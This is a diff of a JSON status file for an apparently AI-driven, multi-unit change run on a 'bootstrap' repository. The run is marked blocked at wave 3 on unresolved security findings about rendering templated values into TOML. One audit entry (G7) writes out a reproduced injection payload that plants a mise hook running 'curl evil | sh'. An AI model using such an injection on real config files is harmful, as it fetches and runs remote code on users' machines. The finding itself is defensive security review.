@@ -10,8 +10,8 @@
   "backlog_pieces": [],
   "gaps_of": [],
   "status": {
-    "state": "RUNNING",
-    "detail": "RUNNING since 2026-11-04T18:22:57Z in /Users/virajpatel/Projects/github.com/virajp/bootstrap/.claude/worktrees/bootstrap-2-0-3ae4b9"
+    "state": "BLOCKED",
+    "detail": "BLOCKED at wave 3 — U3 UNRESOLVED: security findings did not converge (1 then 2, G7); rule in D6 whether a rendered value must also leave every fixed value unchanged and be checked with the generator's parser, or whether the values file is trusted and the key-path check stands (G8); U4, U5 skipped (depend on U3); worktree /Users/virajpatel/Projects/github.com/virajp/bootstrap/.claude/worktrees/bootstrap-2-0-3ae4b9"
   },
   "consent": {
     "merge": true,
@@ -68,8 +68,8 @@
       "waits": "",
       "status": "green",
       "started": "2026-11-04T18:23:14.592Z",
-      "ended": "2026-11-04T18:50:35.726Z",
-      "commit": "10038de",
+      "ended": "2026-11-04T20:04:45.458Z",
+      "commit": "78669ea",
       "rounds": 2
     },
     {
@@ -88,8 +88,8 @@
       "waits": "Its cases run the generator that U1 moves into sync-engine/mise, and one case calls that library directly.",
       "status": "green",
       "started": "2026-11-04T19:24:15.556Z",
-      "ended": "2026-11-04T19:42:58.813Z",
-      "commit": "fa6f8ab",
+      "ended": "2026-11-04T20:21:03.255Z",
+      "commit": "a1fe97a",
       "rounds": 1
     },
     {
@@ -105,14 +105,14 @@
         "U2"
       ],
       "waits": "",
-      "status": "pending",
-      "started": "",
-      "ended": "",
+      "status": "unresolved",
+      "started": "2026-11-04T19:51:56.795Z",
+      "ended": "2026-11-04T20:25:43.240Z",
       "commit": "",
-      "rounds": 0,
+      "rounds": 2,
       "range": {
-        "from": "",
-        "to": ""
+        "from": "631575a",
+        "to": "a1fe97a"
       }
     },
     {
@@ -134,9 +134,9 @@
         "U3"
       ],
       "waits": "",
-      "status": "pending",
+      "status": "skipped",
       "started": "",
-      "ended": "",
+      "ended": "2026-11-04T20:25:43.308Z",
       "commit": "",
       "rounds": 0
     },
@@ -152,9 +152,9 @@
         "U4"
       ],
       "waits": "",
-      "status": "pending",
+      "status": "skipped",
       "started": "",
-      "ended": "",
+      "ended": "2026-11-04T20:25:43.375Z",
       "commit": "",
       "rounds": 0
     }
@@ -174,21 +174,21 @@
     },
     {
       "id": "W3",
-      "status": "pending",
-      "started": "",
-      "ended": ""
+      "status": "failed",
+      "started": "2026-11-04T19:51:56.759Z",
+      "ended": "2026-11-04T20:25:43.439Z"
     },
     {
       "id": "W4",
-      "status": "pending",
+      "status": "failed",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.477Z"
     },
     {
       "id": "W5",
-      "status": "pending",
+      "status": "failed",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.514Z"
     }
   ],
   "shared_files": [
@@ -309,28 +309,28 @@
   ],
   "stages": {
     "renders": {
-      "state": "pending",
-      "detail": "",
+      "state": "skipped",
+      "detail": "no covers",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.751Z"
     },
     "acceptance": {
-      "state": "pending",
-      "detail": "",
+      "state": "skipped",
+      "detail": "no covers",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.548Z"
     },
     "ux": {
-      "state": "pending",
-      "detail": "",
+      "state": "skipped",
+      "detail": "no covers",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.652Z"
     },
     "reconcile": {
-      "state": "pending",
-      "detail": "",
+      "state": "skipped",
+      "detail": "no covers; edit units alone",
       "started": "",
-      "ended": ""
+      "ended": "2026-11-04T20:25:43.850Z"
     }
   },
   "gaps": [
@@ -353,6 +353,48 @@
       "unit": "U2",
       "stage": "edit",
       "text": "case 3, 'the existing conf.d file is not listed as updated', names no real run · checked on the dry-run log only; no real-run case proves the file stays on disk",
+      "state": "open"
+    },
+    {
+      "id": "G4",
+      "unit": "U3",
+      "stage": "security",
+      "text": "D6 and U1 treat a value that breaks TOML only as a parse failure; they do not require a rendered value to stay inside its string · the run took the check that the rendered copy has the same key paths as the raw tools.toml, code 2 on a difference",
+      "state": "open"
+    },
+    {
+      "id": "G5",
+      "unit": "U1",
+      "stage": "security",
+      "text": "the fix left open a raw file that holds <% and does not parse as TOML, against D6 · fail closed, code 2 on the render failure path, message '<shown>: not valid TOML before render: <message>'",
+      "state": "open"
+    },
+    {
+      "id": "G6",
+      "unit": "U2",
+      "stage": "security",
+      "text": "'not valid TOML before render' cannot be reached through a full sync, because each side reads every tools.toml as TOML first and stops with code 2 on its own message · the case calls _se_mise_render directly; a raw non-TOML file is refused on every path",
+      "state": "open"
+    },
+    {
+      "id": "G7",
+      "unit": "U3",
+      "stage": "security",
+      "text": "Non-converging security findings at U3: round 1 had 1 finding (rendered value adds TOML tables, low), fixed by the key-path compare in 78669ea; round 2 has 2, so the guard tripped and security findings cannot become gaps. Round 2: [medium] sync-engine/mise:455, the finding is not resolved, a value can replace a fixed value (two expressions, the first redefines the keys and opens a multi-line string that swallows the raw lines up to the second, key paths stay equal; reproduced rc=0 on macos with a=x\"\\n[mise.hooks]\\nenter = \"curl evil | sh\"\\n[mise.bootstrap.user]\\nlogin_shell = \"\"\" and b=\"\"\"\\n#). [low] sync-engine/mise:446, the check parses with yq and the generator with gomplate, they disagree on the key <<, so a value can add keys under that name · no assumption taken; the run paused. Both need write access to the values file, which can already add mise config directly, and no shipped tools.toml holds <% yet",
+      "state": "open"
+    },
+    {
+      "id": "G8",
+      "unit": "U3",
+      "stage": "security",
+      "text": "D6 and 01-engine.md never require that a rendered value leaves every fixed value unchanged, or that the check uses the generator's TOML parser · no assumption taken; this is the ruling the run stopped for",
+      "state": "open"
+    },
+    {
+      "id": "G9",
+      "unit": "U4",
+      "stage": "edit",
+      "text": "Docs lines from the wave reviews for U4, held here because the run stopped before U4: README.md:52 (sync-engine library list omits mise), README.md:375 (Tests passage omits the macos cases that call sync-engine/mise directly), docs/design/mise.md:147 (Dev only row omits bootstrap and dotfiles), docs/design/mise.md (moved function names and REPO_SYNC_ENV* now SYNC_ENGINE_MISE_*), CLAUDE.md 'mise config' (dev-only list lacks bootstrap and dotfiles), CLAUDE.md 'How the sync operates' (four libraries; file list omits mise; test:repo-sync bullet) · U4 applies them on the resume",
       "state": "open"
     }
   ],
